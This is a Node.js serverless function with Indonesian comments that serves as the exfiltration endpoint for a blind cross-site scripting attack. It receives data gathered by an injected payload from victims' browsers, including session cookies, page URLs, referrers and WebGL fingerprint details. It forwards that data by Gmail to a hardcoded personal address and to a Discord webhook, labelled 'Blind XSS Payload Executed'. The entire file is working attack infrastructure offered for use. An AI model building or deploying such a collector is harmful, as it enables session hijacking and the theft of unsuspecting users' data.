const nodemailer = require('nodemailer');
const fetch = require('node-fetch'); // Tambahkan ini untuk menggunakan fetch di Node.js

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: 'Method Not Allowed',
        };
    }

    const data = JSON.parse(event.body);
    console.log('Received data:', data);

    // Konfigurasi transporter Gmail menggunakan environment variables
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.GMAIL_USER, // Mengambil email dari environment variable
            pass: process.env.GMAIL_PASSWORD, // Mengambil password dari environment variable
        },
    });

    // Kirim email
    const mailOptions = {
        from: process.env.GMAIL_USER, // Email pengirim
        to: 'gerhanagulita@gmail.com', // Email tujuan
        subject: 'Blind XSS Payload Executed',
        text: `Blind XSS payload executed. Data: ${JSON.stringify(data, null, 2)}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('Email sent');
    } catch (error) {
        console.error('Error sending email:', error);
    }

    // Kirim notifikasi ke Discord
    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL; // Mengambil URL webhook Discord dari environment variable
    const discordMessage = {
        content: '🚨 **Blind XSS Payload Executed** 🚨',
        embeds: [
            {
                title: 'Payload Details',
                fields: [
                    { name: 'Identifier', value: data.identifier || 'N/A', inline: true },
                    { name: 'URL', value: data.url || 'N/A', inline: false },
                    { name: 'Cookies', value: data.cookies || 'N/A', inline: false },
                    { name: 'Screen Resolution', value: `${data.screenResolution.width}x${data.screenResolution.height}` || 'N/A', inline: true },
                    { name: 'Language', value: data.language || 'N/A', inline: true },
                    { name: 'Time Zone', value: data.timeZone || 'N/A', inline: true },
                    { name: 'Referrer', value: data.referringURL || 'N/A', inline: false },
                    { name: 'WebGL Vendor', value: data.webGLInfo.vendor || 'N/A', inline: true },
                    { name: 'WebGL Renderer', value: data.webGLInfo.renderer || 'N/A', inline: true },
                ],
                timestamp: new Date().toISOString(),
            },
        ],
    };

    try {
        await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage),
        });
        console.log('Notification sent to Discord.');
    } catch (error) {
        console.error('Error sending notification to Discord:', error);
    }

    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Data received and notifications sent' }),
    };
};